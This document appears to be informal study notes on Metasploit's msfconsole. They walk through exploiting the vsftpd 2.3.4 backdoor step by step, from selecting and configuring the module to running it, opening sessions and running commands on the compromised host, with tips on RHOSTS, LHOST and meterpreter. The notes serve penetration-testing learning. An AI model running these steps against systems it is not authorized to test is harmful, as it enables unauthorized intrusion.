msfconsole - SART METASPLOIT (DO SOME RESEARCH TO GET TO KNOW THE USSAGE LASHON!)

INSIDE: msf:
 search --- searching inside the software

EXAMPLE USAGE FOR FTP:

msf > use exploit/unix/ftp/vsftpd_234_backdoor
msf exploit(vsftpd_234_backdoor) > show targets
    ...targets...
msf exploit(vsftpd_234_backdoor) > set TARGET < target-id >
msf exploit(vsftpd_234_backdoor) > show options
    ...show and set options...

msf exploit(vsftpd_234_backdoor) > exploit (exploit -j -z) --- running the exploit in the background; and solve conectivity problems if there are some!

sessions -l --- shows active sessions!
sessions 1 --- start the session and the connection (1 is the ID got from command 
"sessions -l" SO BE AWARE!)

background --- the session is not closed but it is in the background

exit --- to loose the connection!

uname -a --- shows who we are but not like "whoami" but a machine version and type and stuff...!


TIPS:
after using every module first use "show options" and get familiar with the options to configure inside!
example:

We need to know what is RHOSTS: 
RHOSTS stands for remote hosts!
LHOST stands for local host! (our IP address in this case (Metasploit))
so make the needed research!


LAST:
learn about "meterpreter" --- (ADVANCED SHELL)!!!
